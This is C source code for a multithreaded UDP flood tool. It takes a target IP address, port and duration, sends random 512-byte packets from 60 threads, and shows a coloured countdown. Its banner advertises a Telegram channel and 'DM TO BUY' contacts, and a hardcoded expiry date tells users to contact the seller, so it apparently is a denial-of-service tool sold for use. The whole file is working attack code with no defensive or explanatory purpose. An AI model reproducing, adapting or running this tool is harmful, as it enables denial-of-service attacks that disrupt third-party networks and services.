#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <wchar.h>
#include <locale.h>
#include <fcntl.h>
#include <termios.h>
#include <signal.h>
#include <errno.h>

// ANSI color codes for crazy effects
char *colors[] = {
    "\033[1;31m", "\033[1;32m", "\033[1;33m", 
    "\033[1;34m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
};

// Characters for the crazy animation
wchar_t anim_chars[] = {L'█', L'▓', L'▒', L'░', L'*', L'!', L'#', L'$', L'%', L'&', L'@', L'?'};

// Structure to hold attack data
struct attack_data {
    char target_ip[INET_ADDRSTRLEN];
    int target_port;
    int attack_duration;
    volatile int *stop_flag;  // Declare the pointer as volatile
};

void set_socket_options(int sock) {
    int opt = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    setsockopt(sock, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt));
    int buffer_size = 1048576;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buffer_size, sizeof(buffer_size));
}

void *attack(void *arg) {
    struct attack_data *data = (struct attack_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;

    if ((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }
    set_socket_options(sock);

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->target_port);
    server_addr.sin_addr.s_addr = inet_addr(data->target_ip);

    endtime = time(NULL) + data->attack_duration;
    char payload[512];
    for (int i = 0; i < sizeof(payload) - 1; i++) {
        payload[i] = 'A' + (rand() % 26);
    }
    payload[sizeof(payload) - 1] = '\0';

    while (time(NULL) < endtime && !(*data->stop_flag)) {
        ssize_t sent = sendto(sock, payload, sizeof(payload), 0,
                              (const struct sockaddr *)&server_addr, sizeof(server_addr));
        if (sent < 0 && (errno == EAGAIN || errno == EWOULDBLOCK)) {
            usleep(100);  // Small sleep for resource efficiency
        } else if (sent < 0) {
            perror("Packet send failed");
            break;
        }
    }
    close(sock);
    pthread_exit(NULL);
}

void *crazy_animation(void *arg) {
    int attack_duration = *(int *)arg;
    int color_index = 0;
    setlocale(LC_CTYPE, "");

    printf("*****************************************\n");
    printf(" TELEGRAM CHANNEL: @LegitAccs\n");
    printf(" DM TO BUY : @Rishi747\n");
    printf(" STOP ATTACK / NEW ATTACK PRESS: Q\n");
    printf(" Expiry Date (IST): 22-10-2024 11:00 PM\n");
    printf("*****************************************\n");

    time_t start_time = time(NULL);
    time_t endtime = start_time + attack_duration;

    while (time(NULL) < endtime) {
        int time_left = (int)(endtime - time(NULL));
        int minutes = time_left / 60;
        int seconds = time_left % 60;

        color_index = rand() % 7;
        wchar_t anim_char = anim_chars[rand() % 12];

        printf("\r%s%c %lc %lc %lc    Time Left: %02d:%02d %s\033[0m",
               colors[color_index], anim_char, anim_chars[rand() % 12], anim_chars[rand() % 12], anim_chars[rand() % 12],
               minutes, seconds, colors[(color_index + 1) % 7]);
        fflush(stdout);
        usleep(100000);  // Sleep to allow smooth animation
    }
    printf("\r%sAttack in progress... Done!                               \033[0m\n", colors[0]);
    return NULL;
}

void set_nonblocking_mode() {
    struct termios term;
    tcgetattr(STDIN_FILENO, &term);
    term.c_lflag &= ~ICANON;
    term.c_lflag &= ~ECHO;
    tcsetattr(STDIN_FILENO, TCSANOW, &term);
}

void *check_for_exit(void *arg) {
    volatile int *stop_flag = (volatile int *)arg;
    set_nonblocking_mode();
    while (1) {
        char c = getchar();
        if (c == 'q') {
            *stop_flag = 1;
            kill(getpid(), SIGTERM);
            break;
        }
    }
    return NULL;
}

void convert_utc_to_ist(struct tm *time_info) {
    time_info->tm_hour += 5;
    time_info->tm_min += 30;

    if (time_info->tm_min >= 60) {
        time_info->tm_min -= 60;
        time_info->tm_hour++;
    }
    if (time_info->tm_hour >= 24) {
        time_info->tm_hour -= 24;
        time_info->tm_mday++;
    }
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("Usage: %s <target_ip> <target_port> <attack_duration>\n", argv[0]);
        return 1;
    }

    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int attack_duration = atoi(argv[3]);

    struct tm expiry_time = {0};
    expiry_time.tm_year = 2024 - 1900;
    expiry_time.tm_mon = 11 - 1;  // October (0-based index)
    expiry_time.tm_mday = 22;
    expiry_time.tm_hour = 12;
    expiry_time.tm_min = 51;
    expiry_time.tm_sec = 0;

    convert_utc_to_ist(&expiry_time);

    time_t current_time_utc;
    time(&current_time_utc);
    time_t expiry_time_utc = mktime(&expiry_time);

    if (difftime(expiry_time_utc, current_time_utc) <= 0) {
        printf("This tool has expired. Please contact @Rishi747.\n");
        return 1;
    }

    volatile int stop_flag = 0;

    // Hardcode number of threads to 2
    int threads = 60;
    pthread_t attack_threads[threads];
    struct attack_data data[threads];

    for (int i = 0; i < threads; i++) {
        strncpy(data[i].target_ip, target_ip, INET_ADDRSTRLEN);
        data[i].target_port = target_port;
        data[i].attack_duration = attack_duration;
        data[i].stop_flag = &stop_flag;

        if (pthread_create(&attack_threads[i], NULL, attack, (void *)&data[i]) != 0) {
            perror("Thread creation failed");
            exit(1);
        }
    }

    pthread_t animation_thread;
    pthread_create(&animation_thread, NULL, crazy_animation, (void *)&attack_duration);

    pthread_t exit_thread;
    pthread_create(&exit_thread, NULL, check_for_exit, (void *)&stop_flag);

    for (int i = 0; i < threads; i++) {
        pthread_join(attack_threads[i], NULL);
    }

    pthread_join(animation_thread, NULL);
    pthread_join(exit_thread, NULL);

    printf("\nAttack completed.\n");
    return 0;
}
